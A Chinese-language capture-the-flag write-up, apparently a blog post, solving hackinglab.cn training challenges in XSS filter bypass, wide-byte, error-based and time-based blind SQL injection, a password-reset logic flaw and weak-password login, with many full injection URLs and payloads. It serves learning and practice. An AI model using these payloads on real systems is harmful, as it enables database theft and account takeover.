    输入框试试能不能xss，发现可以，直接输入什么就直接打在原页面上。

```
那么直接贴串alert进去就得到key了
```

1. XSS基础2:简单绕过

   跟上一关相同，只是过滤了script关键词，于是构造别的标签亦然可以绕过，比如我构造的:

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/23195023.jpg)

   提交得到key

2. XSS基础3:检测与构造

   检查了过滤列表，发现过滤的是 单双引号+某些script关键字组合

   思考一下，想到用eval函数来绕过，于是:

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/74619810.jpg)

3. Principle很重要的XSS

   我们的思路:
   对于黑盒XSS,首先要知道在哪里过滤的,过滤了什么,如何过滤的,什么情况下触发过滤 即Where/What/How/When,之后便可以建立自己的Fuzz Testing Libs

   hint说看看过滤了什么，于是我们看看
   过滤了：
   < 左标签符,
   onclick属性,
   alert函数,

   偶然间尝试了两个on事件，onmouseover和onmouseout发现可以执行，于是相当easy,用脚本转换一下js语句，

   ```
   '''word2ascii.py'''
   #coding:utf8
   
   string = 'alert(HackingLab)'
   
   output_str = ''
   
   for i in range(len(string)):
       if i == (len(string)-1):
           dot = ''
       else:
           dot = ','
       output_str+=(str(ord(string[i]))+dot)
   
   print(output_str)
   ```

   构造语句如下，

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/89396881.jpg)

   得到key，总算….
   ps: 如果是onmouseover事件会被认为你想进行对这个网站的攻击….我也不知道为什么…onmouseout怎么就不算攻击了…估计要考虑过滤列表设计问题?

   总结: 还是多尝试，先给能触发js代码的事件列个表(最好)，各种情况触发条件都要心里有点数

## 注入关

1. 最简单的SQL注入

   tips:login as admin

   尝试php万能密码

   admin’ 1=1#

   构造如下:

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/87504288.jpg)

   提交得到key

2. 最简单的SQL注入(熟悉注入环境)

   tips:id=1，
   很简单，什么都没过滤，于是一步步来就可以得到key

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/56025185.jpg)

3. 防注入

   tips:id=1

   试试发现过滤了and，那么用&&替代，

   终于报错了，发现响应头是gb2312，应该是要宽字节注入。不知道以前我是怎么做出来的，唯一想起来的就是以前测试宽字节注入也没怎么成功过，%df’总还是不能像别人博客里写的一样成功绕过，为什么呢????

   构造如下，产生报错
   /index.php?id=1%df%27;%df%22–%20

   接下来开始继续尝试

   构造如下成功测试
   /index.php?id=1%df’ order by 3 –%20

   然后
   /index.php?id=1%df’ union select 1,2,3 –%20

   爆出数据库名
   /index.php?id=1%df’ union select 1,database(),3 –%20

   然后
   /index.php?id=1%df%27%20union%20select%201,table_name,3%20from%20information_schema.tables%20where%20table_schema=0x6D79646273%20–%20

   爆出表名

   其实一般来说，应该要用limit一起，慢慢测试的，但因为这题比较简单，表就一个，于是不加limit也可以
   还有一个注意点就是，碰到过滤单双引号的时候，可以考虑 需要单双引号的地方就直接把单双引号内的值转成十六进制 0x**** 的形式，直接代替单双引号的值，这样用不着单双引号也可以执行sql语句。

   知道表名后慢慢测试，构造
   http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,column_name,3%20from%20information_schema.columns%20where%20table_name=0x7361655F757365725F73716C6934%20limit%202,1%20--%20

   这里就要用limit了，方便一点，于是知道了所有列名

   最后构造
   /index.php?id=1%df%27%20union%20select%201,id,content_1%20from%20sae_user_sqli4%20limit%202,1%20–%20

   得到key

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/3746210.jpg)

4. 到底能不能回显
   分值: 350

   小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？

   我只想说…出题者戏真多..

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/72624166.jpg)
   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/6099068.jpg)
   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/90581991.jpg)
   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/42995857.jpg)
   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/27373701.jpg)
   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/37220050.jpg)

   戏多这题也还是要做，测试发现它依旧存在宽字节注入，这不是重点，重点是它的语句类似于select * from table_name limit start,num

   于是…学习一下，limit后如何注入，忘记了…

   > http://www.freebuf.com/articles/web/57528.html

   这里记一下mysql5.x的语法

   ```
    SELECT
        [ALL | DISTINCT | DISTINCTROW ]
          [HIGH_PRIORITY]
          [STRAIGHT_JOIN]
          [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
          [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
        select_expr [, select_expr ...]
        [FROM table_references
        [WHERE where_condition]
        [GROUP BY {col_name | expr | position}
          [ASC | DESC], ... [WITH ROLLUP]]
        [HAVING where_condition]
        [ORDER BY {col_name | expr | position}
          [ASC | DESC], ...]
        [LIMIT {[offset,] row_count | row_count OFFSET offset}]
        [PROCEDURE procedure_name(argument_list)]
        [INTO OUTFILE 'file_name' export_options
          | INTO DUMPFILE 'file_name'
          | INTO var_name [, var_name]]
        [FOR UPDATE | LOCK IN SHARE MODE]]
    
   ```

   从上至下顺序不能反的，可以没有这个语句但顺序要按这个来。
   于是limit后有procedure 和into语句

   into不考虑，一般没有写权限…重点是Procedure，Mysql默认可用的存储过程只有ANALYSE([max_elements,[max_memory]])

   PROCEDURE ANALYSE 通过分析select查询结果对现有的表的每一列给出优化的建议

   PROCEDURE ANALYSE的语法如下:

   ```
    select ... from ... where ... procedure analyse([max_elements,[max_memory]])
    
   ```

   这些仍然不是重点，重点是要让sql语句产生报错啊，也就是所谓的报错注入。

   writeup中的测试语句:

   /index.php?num=1&start=5 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)–%20

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/19403546.jpg)

   产生XPATH报错

   分析一下这句测试语句

   extractvalue()报错利用
   举例:
   select * from test_table and extractvalue(1,concat(0x7e,(select version())));

   报错结果:ERROR 1105 (HY000): XPATH syntax error: ‘~10.1.21-MariaDB’

   extractvalue很关键，要报错注入一般是 extractvalue(随意参数比如1，concat(随意字符，(输出错误语句比如:select version())))

   语句中 1是个相当”随便”的参数，字符’123’或者数字rand()都可以报错成功，
   这个concat是必须的,没有concat的话，报错结果将会是个不完整的值，或者干脆返回空值。

   MID()函数，用于从文本字段中提取字符。

   语法：SELECT MID(column_name,start[,length]) FROM table_name;

   返回一个column_name被截取的字符构成的表
   strat从1开始（不是从0）
   length可选，是要提取的长度

   sql中的IF条件语句

   语法：IF( expr1 , expr2 , expr3 )

   expr1 的值为 TRUE，则返回值为 expr2
   expr2 的值为FALSE，则返回值为 expr3

   应用示例:
   select *,if(book_name=’java’,’有货’,’已卖完’) as product_status from book where price =50;

   LIKE操作符：

   string like pattern

   pattern示例: ‘%g’ 匹配以g结尾的string。

   “%” 可用于定义通配符（模式中缺少的字母）

   BENCHMARK()函数是 测试函数性能的函数，它有两个参数，第一个参数是要执行第二个参数的次数，第二个参数是一个语句，比如此处的sha1(1)，执行加密1 一定次数，

   综上，这道题难道tm的要用报错+延时!? 求求你放过我吧，

   改进测试语句

   变成 PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select database()),0x7e))),1)–%20
   爆出数据库名

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/9860687.jpg)

   然后
   PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select table_name from information_schema.tables where table_schema=0x6D79646273 limit 0,1),0x7e))),1)–%20

   慢慢求limit返回的
   0是article表，1是user表,其他没有了

   然后
   PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select column_name from information_schema.columns where table_name=0x75736572 limit 0,1),0x7e))),1)–%20

   分别求article下的表和user下的表，直觉告诉我应该求user的，忘了说了，因为这题要考虑宽字节注入，所以可以把表名列名之类的转成十六进制

   求得user下的列名，
   0是id，1是username，2是password，3是lastloginIP，其它就没有了

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/81237858.jpg)

   然后
   PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select password from user limit 0,1),0x7e))),1)–%20

   直觉告诉我key在password下

   0是user，1是admin，2是myflagishere，3没有了我次奥

   username中，0是user，1是admin，2是flag

   user表下tm没有key我次奥?

   考虑article表
   PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select column_name from information_schema.columns where table_name=0x61727469636C65 limit 0,1),0x7e))),1)–%20

   0是id，1是title，2是contents，3是isread，

   找了一遍没找到????????哪里没读到，不知道…测累了，睡觉，明天再找key

   ------

   误会了，原来key不是一串胡乱的字符

   key的确是在user表下,password列里，我的直觉的没错~
   key是一串英文 myflagishere

5. 邂逅

   分值: 350

   小明今天出门看见了一个漂亮的帅哥和漂亮的美女，于是他写到了他的日记本里。

```
tips给的是 id=1

然而id后测试注入似乎并不行，id=2发现是另一组数组，有图片，于是思考是否是图片路径存在注入

并没什么卵用，于是抓包，发现返回sqlerror，于是在bp里尝试注入

/images/cat1.jpg%df'%20order%20by%204%20--%2

得到表的列数为4

/images/cat1.jpg%df'%20union%20select%201,2,database(),4%20--%20

得到数据库名，mydbs


/images/cat1.jpg%df'%20union%20select%201,2,table_name,4%20from%20information_schema.tables%20where%20table_schema=0x6D79646273%20limit%200,1%20--%20

爆表名
0是article，1是pic

/images/cat1.jpg%df'%20union%20select%201,2,group_concat(column_name),4%20from%20information_schema.columns%20where%20table_name=0x61727469636C65%20--%2

学到一个group_concat,不用再用limit一个个来尝试了，group_concat(column_name)
直接将要爆的article下的所有列名用逗号连接并返回。

爆列名
article下，id,title,content,others        
pic下，id,picname,data,text 


/images/cat1.jpg%df'%20union%20select%201,2,group_concat(picname),4%20from%20pic%20--%2

最后爆pic成功

得到flag

![](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/82252542.jpg)
```

1. ErrorBased

   分值: 150

   本题目为手工注入学习题目，主要用于练习基于Mysql报错的手工注入。Sqlmap一定能跑出来，所以不必测试了。flag中不带key和#
   该题目需要在题目平台登录

   题目说的这么明白，那就直接上吧

   /index.php?username=admin%df%27%20and%20extractvalue(rand(),concat(0x7e,(select%20database()),0x7e));–%20

   爆出数据库 mydbs

   /index.php?username=admin%df%27%20and%20extractvalue(rand(),concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x6D79646273),0x7e));–%20

   爆出所有表名
   log,motto,user

   /index.php?username=admin%df%27%20and%20extractvalue(rand(),concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x6D6F74746F),0x7e));–%20

   爆列名
   motto下，id,username,motto
   user下，id,username,password

   /index.php?username=admin%df%27%20and%20extractvalue(rand(),concat(0x7e,(select%20group_concat(username)%20from%20user),0x7e));–%20

   爆user
   username列没有，password列没有
   爆motto
   motto列下，mymotto,happy everyday,nothing
   username列下，admin,guest,test,#adf#ad@@#
   最后一个应该就是flag

2. 盲注

   分值: 200

   今天我们来学习一下盲注.小明的女朋友现在已经成了女黑阔,而小明还在每个月拿几k的收入,怎么养活女黑阔………..so:不要偷懒哦!

   盲注，当初这题盲注了一下午，也没弄出来

   sql中的substr()函数，
   SUBSTR (str, pos, len）
   由 中的第 位置开始，选出接下去的 个字元。
   pos位置从1开始(不是从0)

   sleep() 函数
   select sleep(3); 则mysql服务器3秒后才返回结果。

   盲注的原理一般是因为看不到页面返回的情况，所以有个技巧叫Timing Attack，延时注入，通过构造比如:
   select if(substr((select database()),1,1) = ‘e’,sleep(5),0);

   利用了if条件句，substr函数和sleep函数，如果数据库第一个字符是e的话则等待5秒，否则为0

   那么在注入点后怎么构造呢…? 尝试了半天

   发现别人都是 select * from table_name and if(1=1,sleep(3),0);
   就成功了，但是实际上，在mysql中这样就直接报错了，而我实际注入测试的时候也发现这并行不通。

   所以我尝试构造注入语句如下:

   select * from table_name union select if(1=1,sleep(3),0);

   报错，因为两个select返回的列并不一致，于是怎么想办法让它们一致，比如改成
   select * from table_name union select if(1=1,sleep(3),0),1,1;

   依次尝试，但如果目标列非常多，这个效率肯定是很慢的。

   但目前只想出来这个，先凑合着用。

   构造如下：
   /blind.php?username=admin’ union select if(1=1,sleep(20),1),1,1;%23

   测试成功，等待了20s，并且知道了目标有三列，知道了就好办。

   继续尝试构造，
   /blind.php?username=admin’ union select if(substr((select database()),1,1)=’m’,sleep(20),1),1,1;%23

   的确等待了20s…所以就很好知道了，数据库名应该是mydbs，验证一下

   验证语句
   ‘ union select if((select database())=’mydbs’,sleep(20),1),1,1;%23

   同时，我们也可以用firebug来帮助查看是否成功
   比如：

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/55452319.jpg)

   等待时间为20秒未免有点长，于是我们可以把它修改成10秒，因为网络问题，可能会有延迟，所以10秒的结果再配合我们习惯上的判断应该是可以猜解出来对应名称的。

   开始爆表
   ‘ union select if(substr((select table_name from information_schema.tables where table_schema=’mydbs’ limit 0,1),1,1)=’a’,sleep(10),1),1,1;%23

   ..从a猜到l终于
   第一个字符是l,第二个字符是o，于是我猜测是login之类的，于是搞了下，发现不对…
   继续一个个字符，前三个得到 log

   这里插一句，mysql中，获取字符串长度的函数为length。

   比如 select length(‘111’); //返回3

   所以我们应该先要判断要查询值的长度，然后再一个个字符的查询。

   构造查长度语句:
   ‘ union select if(length((select table_name from information_schema.tables where table_schema=’mydbs’ limit 0,1))>2,sleep(10),1),1,1;%23

   多次测试知道了第一个table长度为3，就是log

   开始猜第二个的长度
   %27%20union%20select%20if(length((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27mydbs%27%20limit%201,1))=5,sleep(10),1),1,1;%23

   第二个表的长度为5，于是开始猜解字符
   第一个字符是m，所以我判断应该是motto…

   判断正确，所以第二个表是motto。

   开始猜第三个表，长度得到为4，因为换了个稳定点的网络，所以我把时间再调小一点，sleep(5)。

   另外我猜测，第三个表是user，验证结果也为user。

   接下来猜第四个表，不存在，因为当我不论怎么判断长度都得不到返回值，于是可以断定没有第四个表。

   综上，结果有三个表，为: log,motto,user

   接下来猜每个表的列名，
   先猜解user列下的，
   第一列，长度为2，列名 id
   第二列，长度为8, 列名 username
   第三列，长度为8, 列名 password

   猜username列，值：admin，guest,test
   猜password列，值：password,guest,1234

   再猜解motto下的
   第一列，长度为2，列名 id
   第二列，长度为8，列名 username
   第三列，长度为5，列名 motto

```
猜username列，值：admin,guest,test,

打了一遍都没有找到，第四个值，于是用ascii函数来搞

sql中 ascii(string),返回string最左边字符的ascii值
比如 select ascii('1'); //返回49

构造
' union select if(ascii(substr((select username from motto limit 3,1),1,1))=35,sleep(5),1),1,1;%23

测试得到第一个字符ascii码值为35，也就是#号

慢慢得到 #adf#abd@@#
35 97 100 102 35 97 98 100 64 64 35

不正确?重新测试

35 97 100 102 35 97 100 64 64 35
#adf#ad@@#:key#notfound!#

不是这个我次奥，心态有点崩

那猜motto列，值：(7)mymotto,(14)happy everyday,(12)nothing help,(14)key#notfound!#

最后一个是答案，答案是 notfound!，我很烦，做这个做了一天啊。。。

还有两个注入关都没有这个盲注烦，实际上这个盲注应该写个脚本来跑的...
上传关三个好像挺简单的，改一改请求头里的一些后缀或者用用%00截断就ok了
```

## 解密关

1.以管理员身份登录系统

```
分值: 450

以管理员身份登录即可获取通关密码(重置即可，无需登录)
补充说明：假设除了admin用户，其它用户的邮箱都可被登录获取重置密码的链接。

用admin重置密码，不可行。于是随便一个用户重置密码，发现url是这样构造的

reset.php?sukey=fa34a2822dda85042a76a8352f1f40f4&username=1
reset.php?sukey=f0156cf8347e939e6720e614b804ac3c&username=123

这个sukey很特别啊，每次都是不一样的，所以试着md5解密，发现其实是个时间戳，于是尝试写一波脚本来搞搞看reset.php..
```

## 综合关

1. 渗透测试第一期

   分值: 350

   注意：该题目模拟真实环境，故具有排他性，请选择合适的时间段完成该题。 你只有一部可用手机，手机号码会在需要手机号码的页面中给出。

   先注册账号比如test123，然后再到 忘记密码页面，填入账号test123获取手机验证码(手机号在源码中给出)，填完了把账号改成admin再post，这样就是改的admin的密码了。。

   然后在登录界面登录admin账户，得到key

2. 没有注入到底能不能绕过登录

   分值: 350

   不是SQL注入

   题目网址的title写着brute force so easy，暗示要用密码爆破，弱口令字典之类的，我自己写了个，只是跑了遍数字，感觉实在太慢了。

   要登录，随便输了个1，1 爆error，又输了个test,test给了个提示说要进admin页面，想到robots.txt，于是一看还真有，disallow:/myadminroot/

   进入，提示说要login as admin，我抓包，username填admin，密码随便填，提示要login first。

   …然后我随便试了几个弱口令，还真特么撞对了…当年看一个密码爆破工具的字典的时候翻到的。

   admin admin123 nimda adminadmin….最后一个就成功了。。。爆出key

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/41754228.jpg)

3. 美图闪亮亮交友平台

   分值: 400

   小明今年19了，看到比自己还小两岁的妹妹都已经有了小男朋友，因此他也想找个女朋友了，于是就来到了美图闪亮亮交友平台，但是他怎么也没想到,上面的妹纸都不理他，于是他只好想办法；最后，他登录到了管理员姑娘的网页版邮箱，发现管理员姑娘其实已经暗恋他已久，于是乎，他们开始了一段惊人的地下恋情。

   通关地址

   ps:出题的人一定是想妹纸想疯了

   Tips: 邮箱没有xss漏洞

   Tips: 管理员用的是手机wap邮箱,而且管理员的手机不支持Cookie(20150823)

   这题，提示很多，说要有开放思维，又说没有后台，

   上传图片那个input栏它是可以被xss的
   比如上传 http://www.hackinglab.cn/meitu.jpg" onclick=”alert(1)

   我猜测是要搞一段存储型css，发送到邮箱

   比如：

   将这段js代码插入到页面某处，

   搞了也没用啊，什么鬼啊。这肯定会爆cookie啊。不明白这题什么意思

   震惊! 当我更新文章时发现我上面的js脚本也被执行了。。。

```
![](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/11808368.jpg)
```

## 总结

学到了挺多的，比如rot13加密，注意到”逻辑漏洞”这个问题，还有弱口令暴力破解

一些sql注入的技巧和相关原理，data协议，base64加密的特征等等。总之，收获还蛮多的，开心: )